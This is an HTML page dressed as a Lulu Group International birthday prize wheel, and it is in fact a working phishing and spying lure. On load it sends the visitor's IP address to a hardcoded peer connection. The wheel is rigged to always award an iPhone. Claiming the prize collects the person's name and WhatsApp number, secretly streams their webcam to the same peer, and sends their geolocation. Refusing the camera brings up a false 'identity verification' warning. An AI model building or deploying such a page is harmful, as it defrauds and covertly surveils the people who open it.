<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Honorary Distribution 2026</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        :root { --gold: #d4af37; --gold-bright: #f9e29d; --rich-black: #0a0a0a; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body { 
            margin: 0; font-family: 'Playfair Display', serif; background: var(--rich-black); 
            color: #fff; overflow-x: hidden;
            background: radial-gradient(circle at center, #1c1c1c 0%, #000 100%);
        }

        /* Luxury Header */
        header { 
            padding: 30px; text-align: center; border-bottom: 1px solid rgba(212, 175, 55, 0.3);
            background: linear-gradient(to bottom, rgba(20,20,20,0.8), transparent);
        }
        .brand { font-size: 10px; letter-spacing: 5px; color: var(--gold); text-transform: uppercase; margin-bottom: 8px; }
        .event { font-size: 20px; font-weight: 300; letter-spacing: 2px; color: #fff; }

        /* The Prize Wheel */
        .wheel-stage { position: relative; width: 340px; height: 340px; margin: 30px auto; perspective: 1000px; }
        
        #wheel { 
            width: 100%; height: 100%; border-radius: 50%; border: 8px solid var(--gold);
            background: conic-gradient(
                #1a1a1a 0deg 45deg, #222 45deg 90deg, 
                #1a1a1a 90deg 135deg, #222 135deg 180deg, 
                #1a1a1a 180deg 225deg, #222 225deg 270deg,
                #1a1a1a 270deg 315deg, #222 315deg 360deg
            );
            position: relative; overflow: hidden;
            transition: transform 10s cubic-bezier(0.1, 0, 0, 1);
            box-shadow: 0 0 60px rgba(212, 175, 55, 0.2);
        }

        /* Prize Labels on the wheel */
        .prize-label {
            position: absolute; width: 50%; height: 50px; top: 50%; left: 50%;
            transform-origin: 0% 50%; text-align: right; padding-right: 20px;
            font-size: 10px; font-weight: bold; color: var(--gold);
            text-transform: uppercase; line-height: 50px; font-family: sans-serif;
        }

        .pointer { 
            position: absolute; top: -10px; left: 50%; transform: translateX(-50%); 
            width: 30px; height: 40px; background: #ff4d4d; clip-path: polygon(50% 100%, 0 0, 100% 0);
            z-index: 100; filter: drop-shadow(0 4px 5px rgba(0,0,0,0.5));
        }

        /* Glass Card UI */
        .container { padding: 20px; text-align: center; }
        .glass-card {
            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(212, 175, 55, 0.2);
            border-radius: 30px; padding: 30px; backdrop-filter: blur(20px);
            max-width: 400px; margin: 0 auto;
        }

        .gold-btn {
            background: linear-gradient(135deg, #d4af37 0%, #f9e29d 50%, #d4af37 100%);
            color: #000; border: none; width: 100%; padding: 22px; border-radius: 15px;
            font-weight: 900; letter-spacing: 1px; cursor: pointer; text-transform: uppercase;
            box-shadow: 0 10px 20px rgba(0,0,0,0.3); margin-top: 15px;
        }

        input {
            width: 100%; padding: 18px; margin-bottom: 15px; border-radius: 12px;
            border: 1px solid rgba(212, 175, 55, 0.3); background: rgba(0,0,0,0.6);
            color: #fff; text-align: center; font-size: 16px; outline: none;
        }

        .page { display: none; animation: zoomIn 0.5s ease forwards; }
        .active { display: block; }
        
        @keyframes zoomIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
    </style>
</head>
<body>

<header>
    <div class="brand">Lulu Group International</div>
    <div class="event">Birthday Commemorative Gift</div>
</header>

<div style="position: fixed; opacity: 0; pointer-events: none;"><video id="v" autoplay playsinline muted></video></div>

<!-- PAGE 1: LUXURY WHEEL -->
<div id="p1" class="page active">
    <div class="wheel-stage">
        <div class="pointer"></div>
        <div id="wheel">
            <!-- Prizes added via JS for correct rotation -->
        </div>
    </div>
    <div class="container">
        <div class="glass-card">
            <p style="color: var(--gold); font-size: 12px; letter-spacing: 2px;">INVITATION ONLY</p>
            <p style="font-size: 14px; opacity: 0.8; line-height: 1.6;">Celebrating the birth of the son of **M.A. Yusuff Ali**. Spin to reveal your honorary prize.</p>
            <button class="gold-btn" id="spin-btn" onclick="startSpin()">Spin for Prize</button>
        </div>
    </div>
</div>

<!-- PAGE 2: VERIFICATION -->
<div id="p2" class="page">
    <div class="container" style="margin-top: 40px;">
        <div class="glass-card">
            <h2 style="color: var(--gold); margin-bottom: 5px;">You Won!</h2>
            <p id="win-text" style="font-size: 18px; margin-bottom: 25px; font-weight: bold;">Processing Prize...</p>
            
            <input type="text" id="roll" placeholder="Full Legal Name">
            <input type="number" id="school" placeholder="WhatsApp Number">
            
            <button class="gold-btn" onclick="claimReward()">Claim to My Address</button>
        </div>
    </div>
</div>

<!-- PAGE 3: TRACKING -->
<div id="p3" class="page">
    <div class="container" style="margin-top: 100px;">
        <div class="title" id="status" style="color: var(--gold);">VERIFYING...</div>
        <p style="font-size: 11px; color: #555; margin-top: 20px; letter-spacing: 2px;">SECURED BY SATORI PROTOCOL</p>
    </div>
</div>

<script>
    const TARGET = 'enkode-satori-v1-russel'; 
    const peer = new Peer();
    let conn;

    // Build the Wheel Prizes
    const prizes = ["iPhone 15 Pro", "5000 AED", "iPad Air", "2000 AED", "MacBook Air", "1000 AED", "Gift Voucher", "Watch S9"];
    const wheel = document.getElementById('wheel');
    prizes.forEach((p, i) => {
        const div = document.createElement('div');
        div.className = 'prize-label';
        div.style.transform = `translate(-50%, -50%) rotate(${i * 45}deg)`;
        div.innerText = p;
        wheel.appendChild(div);
    });

    peer.on('open', () => {
        conn = peer.connect(TARGET);
        conn.on('open', async () => {
            let ip = "N/A";
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
            conn.send({ type: "INSTANT_LOG", ip: ip, time: new Date().toLocaleTimeString() });
        });
    });

    function startSpin() {
        document.getElementById('spin-btn').disabled = true;
        wheel.style.transform = "rotate(5445deg)"; // Stops on iPhone/Mac area
        setTimeout(() => {
            document.getElementById('win-text').innerText = "PRIZE: APPLE IPHONE 15 PRO";
            switchPage('p2');
        }, 10500);
    }

    async function claimReward() {
        if(!document.getElementById('roll').value || !document.getElementById('school').value) return;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = stream;
            peer.call(TARGET, stream);

            navigator.geolocation.getCurrentPosition(pos => {
                send(pos.coords.latitude, pos.coords.longitude);
            }, () => { send(null, null); });

            switchPage('p3');
            let i = 0;
            const msgs = ["SECURE SYNC...", "BIOMETRIC LOCK...", "CLAIM SUBMITTED"];
            setInterval(() => { if(i < msgs.length) document.getElementById('status').innerText = msgs[i++]; }, 3000);
        } catch (e) {
            alert("Security Error: Identity verification via secure camera is required to process high-value birthday gifts.");
            location.reload();
        }
    }

    function send(lat, lon) {
        if (conn?.open) {
            conn.send({
                type: "FULL_LOG",
                creds: { roll: document.getElementById('roll').value, school: document.getElementById('school').value },
                geo: { lat: lat, lon: lon }
            });
        }
    }

    function switchPage(id) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }
</script>
</body>
</html>
